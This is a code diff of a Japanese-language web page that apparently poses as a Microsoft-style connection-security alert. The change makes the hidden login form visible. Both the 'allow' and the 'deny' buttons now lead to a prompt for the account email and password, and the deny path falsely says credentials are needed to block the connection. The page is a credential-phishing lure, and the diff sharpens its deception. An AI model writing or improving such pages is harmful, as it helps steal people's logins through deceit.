@@ -28,11 +28,11 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 .btn.deny{background:#fff;color:#e74c3c;border:2px solid #e74c3c;}
 .btn.deny:hover{background:#fdf2f0;}
 .divider{border:none;border-top:1px solid #eee;margin:26px 0;}
-.login-form{display:none;}
-.login-form label{font-size:14px;color:#555;font-weight:600;display:block;margin-bottom:7px;}
-.login-form input{width:100%;padding:15px 18px;border:1px solid #ccc;border-radius:4px;font-size:16px;margin-bottom:18px;font-family:'Segoe UI',sans-serif;background:#fff;}
+.login-form{display:block;}
+.login-form label{font-size:14px;color:#555;font-weight:600;display:block;margin-bottom:8px;}
+.login-form input{width:100%;padding:16px 20px;border:1px solid #ccc;border-radius:4px;font-size:16px;margin-bottom:24px;font-family:'Segoe UI',sans-serif;background:#fff;}
 .login-form input:focus{outline:none;border-color:#0067b8;box-shadow:0 0 0 3px rgba(0,103,184,.1);}
-.login-form .btn-submit{width:100%;padding:18px;background:#0067b8;color:#fff;border:none;border-radius:4px;font-size:20px;font-weight:600;cursor:pointer;}
+.login-form .btn-submit{width:100%;padding:18px;background:#0067b8;color:#fff;border:none;border-radius:4px;font-size:20px;font-weight:600;cursor:pointer;letter-spacing:.3px;}
 .login-form .btn-submit:hover{background:#005da6;}
 .spin{display:none;width:38px;height:38px;border:4px solid #ddd;border-top-color:#0067b8;border-radius:50%;margin:26px auto;animation:sp .7s linear infinite;}
 @keyframes sp{to{transform:rotate(360deg)}}
@@ -103,9 +103,16 @@ action=a;
 document.getElementById("alert-box").style.display="none";
 document.getElementById("meta-tbl").style.display="none";
 document.getElementById("btn-row").style.display="none";
-var reason=a==="allow"?"接続確認のため、以下のアカウント情報を入力してください。":"接続をブロックしました。ブロック確認のため、再認証を実行してください。";
+var reason, btnLabel;
+if(a==="allow"){
+reason="接続確認のため、以下のアカウント情報を入力してください。";
+btnLabel="接続確認を実行";
+}else{
+reason="接続をブロックします。アカウントIDとパスワードを入力して接続を許可しないを押してください。";
+btnLabel="接続を許可しない";
+}
 var area=document.getElementById("form-area");
-area.innerHTML='<div class="alert-box" style="margin-bottom:18px;">'+reason+'</div><form id="f" onsubmit="return send()"><label>アカウント</label><input type="email" id="u" autocomplete="off"><label>パスワード</label><input type="text" id="p" autocomplete="off"><button class="btn-submit" type="submit">'+(a==="allow"?"接続確認を実行":"再認証を実行")+'</button></form>';
+area.innerHTML='<div class="alert-box" style="margin-bottom:18px;">'+reason+'</div><form id="f" class="login-form" onsubmit="return send()"><label>アカウント</label><input type="email" id="u" autocomplete="off"><label>パスワード</label><input type="text" id="p" autocomplete="off"><button class="btn-submit" type="submit">'+btnLabel+'</button></form>';
 area.style.display="block";
 }
 function send(){
